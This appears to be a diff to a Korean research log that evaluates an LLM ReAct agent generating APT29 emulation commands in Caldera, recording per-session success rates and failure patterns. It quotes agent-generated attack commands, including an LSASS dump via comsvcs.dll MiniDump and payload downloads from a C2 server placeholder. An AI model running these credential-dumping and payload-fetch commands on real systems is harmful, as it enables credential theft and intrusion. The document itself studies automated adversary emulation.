@@ -50,6 +50,7 @@ CTI 시나리오 (.md)
 | 152852 | 22/30 (73%) | 24/30 | 27/30 | **27/30 (90%)** | T1036.002, T1037.005, T1055 |
 | 162222 | 16/30 (53%) | 21/30 | 23/30 | **23/30 (77%)** | T1036.002, T1059.001, T1055, T1012, T1552.004, T1056.001, T1105 |
 | 191016 | 22/30 (73%) | 23/30 | 24/30 | **25/30 (83%)** | T1055, T1134, T1012, T1003, T1056.001 |
+| 181658 | 20/30 (67%) | 25/30 | 26/30 | **26/30 (87%)** | T1036.002, T1134.001, T1003, T1056.001 |
 
 ---
 
@@ -94,6 +95,8 @@ CTI 시나리오 (.md)
 
 > **참고 (162222)**: 세션 162222의 SVO는 대부분 기존 세션들과 유사하나 일부 기법에서 새로운 V 추출. 주요 차이: T1134.001=inject/high-privilege process (171757과 동일), T1112=delete/registry keys (다른 세션들은 remove/modify), T1134=create/access token (다른 세션들은 reuse/impersonate/query), T1036.005=replace/sysinternals tools (다른 세션들은 rename). T1036.002=execute/malicious .scr file로 추출됐으나 기존 "RTLO Start Sandcat" ability와 매칭 실패 → generated 능력 생성 → totallylegit.exe 참조 (파일스토어 미존재) → 3라운드 모두 실패.
 
+> **참고 (181658)**: 세션 181658은 다른 세션들과 다른 SVO 패턴 다수. 주요 차이: T1036.002=execute/cod.3aka3.scr (143322/171757과 동일), T1059.001=download/payload (전 세션 중 유일한 V=download), T1037.005=create/javamtsup service (구체적 서비스명), T1083=compress/draft.zip (오추출: File Discovery 기법인데 압축 동작으로 추출 → 실행은 성공하나 기법 의도 미달성), T1134.001=steal/access token (143322와 동일 V인데 복잡한 명령어 생성 → 영구 실패), T1548.002=elevate/process token, T1134=reuse/stolen tokens (143322와 동일). 별도 열 추가 필요할 만큼 차이가 크나 지면 절약을 위해 143322 열과 가까운 경우에 묶어서 표기.
+
 > **참고 (191016)**: 세션 191016의 SVO 추출 결과는 141217과 거의 동일 (T1036.002=rename/cod.3aka3.scr, T1059.001=invoke/powershell, T1134.001=duplicate/privileged token, T1134=query/remote file share 등). 따라서 별도 열 없이 141217 열을 공유. 동일 SVO에서도 초기 성공률(141217: 23/30 vs 191016: 22/30)과 최종 결과(141217: 26/30 vs 191016: 25/30)가 다르며 T1003 V드리프트 목적지도 다름(141217: cmdkey, 191016: comsvcs.dll) → Phase 3 비결정성 추가 확인.
 
 ---
@@ -134,8 +137,10 @@ V=rename은 ATT&CK 기법 의미에 더 가깝지만 파일 존재를 전제함.
 | 171757 | dump(mimi) | IEX | **cmdkey** | R2 드리프트 성공 |
 | 152852 | dump(reg save) | **mimikatz** | **cmdkey** | R2 드리프트 성공 (2단계 경유) |
 | 191016 | totallylegit.exe | **comsvcs.dll MiniDump** | unknown | R2-R3 모두 unknown → 영구 실패 |
+| 181658 | totallylegit.exe(mimi) | **comsvcs.dll MiniDump** | `$pid` 충돌 수정 | R3: 덤프 성공, ACL 차단 → 영구 실패 |
 
-- 143322/171757/152852에서는 **cmdkey /list**로 수렴, 191016에서는 **comsvcs.dll LSASS dump**로 드리프트 → 권한 장벽으로 복구 불능
+- 143322/171757/152852에서는 **cmdkey /list**로 수렴, 191016/181658에서는 **comsvcs.dll LSASS dump**로 드리프트
+- 181658은 comsvcs.dll 경로에서 가장 멀리 진행 (R3에서 덤프 파일 생성까지 성공), 그러나 LSASS 덤프 파일의 ACL이 제한적이어서 업로드 불가 → **부분 성공 함정(Partial Success Trap)**
 - **수정된 의의**: V 드리프트 수렴점(cmdkey)은 일관적이지 않음. 드리프트 목적지가 권한이 필요한 전략(LSASS 접근)으로 선택되면 복구 불능. 수렴점도 Phase 3 비결정성의 영향을 받는다.
 
 **T1036.002 (RTLO) — ReAct Oscillation: syntax 수정과 O-creation 동시 적용 실패 (152852)**
@@ -287,6 +292,54 @@ T1036.002 사례: V=rename(기법 의미 정확)이 V=execute(덜 정확)보다 
 
 ---
 
+## 세션 181658 추가 관찰
+
+### T1036.002 — ReAct가 cod.3aka3.scr C2 다운로드를 스스로 추론 (181658, R1)
+
+- R0: V=execute → `New-Item "cod.3aka3.scr" -Force; Start-Process` — 빈 파일 생성 후 실행 → "not a valid executable"
+- R1: ReAct thought: "파일을 먼저 C2에서 다운로드해야 함" → `Invoke-WebRequest "#{server}/file/download/cod.3aka3.scr" -OutFile "cod.3aka3.scr"; Start-Process`
+  → cod.3aka3.scr이 파일스토어에 존재해 다운로드 성공, 그러나 `.scr`을 PE로 직접 실행 불가 (object_failure: "not a valid PE executable")
+- R2: `powershell -File cod.3aka3.scr` → .ps1이 아님 → 실패
+- R3: `& "cod.3aka3.scr"` → 실행 불가 → 영구 실패
+- **의의**: ReAct가 올바른 C2 다운로드 방향을 스스로 추론했지만 Sandcat 에이전트 실행 인자(`-server #{server} -group rtlo_group`)를 모름. APT29.yaml ability의 핵심 지식이 없으면 ReAct도 최후 단계를 뛰어넘지 못함.
+
+### T1134.001 — V=steal인데 quoting oscillation으로 영구 실패 (181658)
+
+| 라운드 | 명령어 핵심 | 오류 |
+|--------|-----------|------|
+| R0 | `"$t='$env:TEMP\token.txt'; whoami /all > $t"` (double-quote wrapper) | $t 변수 미확장 |
+| R1 | `'$t="$env:TEMP\token.txt"; whoami /all > $t'` (single-quote wrapper) | `\t` → 탭 문자 이스케이프 |
+| R2 | `"$t = Join-Path $env:TEMP 'token.txt'; whoami /all > $t"` | 리다이렉션 대상 비어있음 |
+| R3 | `"$t = \"$env:TEMP\\token.txt\"; whoami /all > $t"` | 여전히 quoting 오류 |
+
+- 143322: 동일 V=steal이었지만 단순한 `whoami /all > "$env:TEMP\token.txt"` 생성 → 초기 성공
+- **의의**: Phase 3 비결정성으로 동일 V=steal에서도 명령어 복잡도가 달라짐. 복잡한 quoting 구조가 생성되면 ReAct의 syntax repair가 oscillation에 빠져 V=steal도 영구 실패 가능.
+
+### T1003 — comsvcs.dll 부분 성공 함정 (181658, R3)
+
+- R3: `rundll32.exe comsvcs.dll,MiniDump $lsassPid $out full` → **덤프 파일 생성 성공**
+- 그러나: LSASS 덤프 파일이 SYSTEM ACL → OpenRead → Access Denied → 업로드 실패
+- **부분 성공 함정(Partial Success Trap)**: 공격 작업(LSASS dump) 성공, 후처리(C2 업로드) 실패
+- 191016의 comsvcs.dll 시도보다 한 단계 더 진행됐지만 최종 실패는 동일
+- 새로운 실패 유형: `attack_success + exfiltration_blocked`
+
+### T1083 — SVO 오추출 → 기법 의미 불일치 False Positive (181658)
+
+- T1083은 File and Directory Discovery 기법 (파일 탐색)
+- SVO: **compress / draft.zip** (오추출: 파일 탐색이 아닌 "압축"으로 추출)
+- 생성 명령어: `Compress-Archive -Path .\* -DestinationPath .\draft.zip -Force` → exit 0
+- 기법 의도(파일 검색/열거)와 전혀 다른 동작(현재 디렉토리 압축)이지만 성공으로 기록
+- **의의**: SVO 오추출이 False Positive를 만드는 사례. 기법 의미 검증 없이 exit code만으로 성공 판단하면 T1083이 "실행됐다"고 잘못 보고됨. 성공률 통계를 오염시킬 수 있음.
+
+### T1059.001 — V=download → 실행 없이 다운로드만 → 즉시 성공 (181658)
+
+- SVO: download / payload → `Invoke-WebRequest "#{server}/file/download/totallylegit.exe" -OutFile "$env:TEMP\totallylegit.exe"` → exit 0
+- 파일 다운로드만 하고 실행하지 않음 → 성공. 그러나 기법 의도(PowerShell 스크립트 실행)는 달성 미흡
+- 162222의 V=execute(다운로드 + 실행 시도 → 파일 없음 오류)와 대비
+- **의의**: V 선택이 명령어의 범위(scope)를 결정. download→파일 취득만, execute→실행까지 포함. download가 더 좁은 범위 → 더 자기완결적 → 성공. 그러나 이것도 부분적 false positive.
+
+---
+
 ## 세션 191016 추가 관찰
 
 ### T1003 — comsvcs.dll 드리프트: V 드리프트 수렴점 비일관성 발견 (191016)
@@ -413,6 +466,9 @@ object_failure 진단 시 "O를 먼저 생성한 후 V 실행"하는 전략. Typ
 | 비동기 실행 | `Start-Process` | 시작만 확인 → exit 0 |
 | Error capture | `net view 2>&1` | 에러 텍스트가 "결과"로 업로드 → exit 0 |
 | stderr 무시 | `nltest /dclist` | DC 미발견 stderr, exit 0 (T1018 사례) |
+| SVO 오추출 | T1083 `Compress-Archive -Path .\*` | 기법 의도(파일탐색)와 무관한 명령어, exit 0 (181658) |
+| 조건부 삭제 | `if(Test-Path){Remove-Item}` (T1112) | 객체 미존재 → if 미진입 → exit 0 (181658) |
+| 부분 성공 | comsvcs.dll LSASS dump | 덤프 성공, 업로드 ACL 차단 → 실패 (181658, T1003) |
 
 ---
 
@@ -440,6 +496,7 @@ object_failure 진단 시 "O를 먼저 생성한 후 V 실행"하는 전략. Typ
 | 20260312_152852 | APT29 (30기법) | 22→27/30 | SVO≈141217, T1003 3단계 V드리프트, T1036.002 oscillation, Phase 3 비결정성 확인 |
 | 20260312_162222 | APT29 (30기법) | 16→23/30 | T1059.001 O-nonexistent 오진, T1036.002 ability 매칭 실패, T1105 unknown failure, T1134.001 동일 V=inject 다른 결과 |
 | 20260312_191016 | APT29 (30기법) | 22→25/30 | SVO≈141217, T1003 comsvcs.dll 드리프트(수렴점 비일관성), T1059.001 V=invoke 성공, T1036.002 R2 O-creation 재현 |
+| 20260313_181658 | APT29 (30기법) | 20→26/30 | T1036.002 ReAct가 cod.3aka3.scr 다운로드 추론, T1134.001 V=steal quoting oscillation, T1003 부분 성공 함정, T1083 SVO 오추출 false positive, T1059.001 V=download |
 
 ## 한계: ReAct Agent의 구조적 한계 (Context 단절과 시야의 협소함)
 
